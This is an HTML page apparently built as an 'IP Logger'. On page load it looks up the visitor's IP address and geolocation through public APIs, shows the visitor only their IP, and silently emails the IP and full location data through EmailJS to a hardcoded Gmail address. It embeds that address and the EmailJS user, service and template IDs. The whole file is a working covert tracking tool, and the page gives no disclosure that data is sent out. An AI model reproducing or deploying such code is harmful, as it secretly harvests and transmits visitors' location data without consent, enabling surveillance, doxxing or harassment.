<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
</head>
<body>
    <h1>Your IP Address Logger</h1>
    <div id="ipDisplay"></div> <!-- Div to display the IP address -->
    <script>
        (function(){
            // Initialize EmailJS
            emailjs.init("xzn0o06W5jFkiRdZ8"); // Replace with your EmailJS User ID

            // Automatically get IP address and location on page load
            $.get('https://api.ipify.org?format=json', function(data) {
                const ip = data.ip;
                $('#ipDisplay').text(`Your IP Address: ${ip}`); // Display the IP address on the website

                $.get(`https://ipapi.co/${ip}/json/`, function(locationData) {
                    const emailParams = {
                        ip: ip,
                        location: JSON.stringify(locationData, null, 2), // Convert to string for email
                        to_email: 'fabegabe26@gmail.com' // Your email address
                    };

                    // Send the email using EmailJS
                    emailjs.send("service_4wkbdl7", "template_52ugwhj", emailParams)
                        .then((response) => {
                            console.log('SUCCESS!', response.status, response.text);
                        }, (error) => {
                            console.error('FAILED...', error); // Log error for debugging
                        });
                });
            });
        })();
    </script>
</body>
</html>
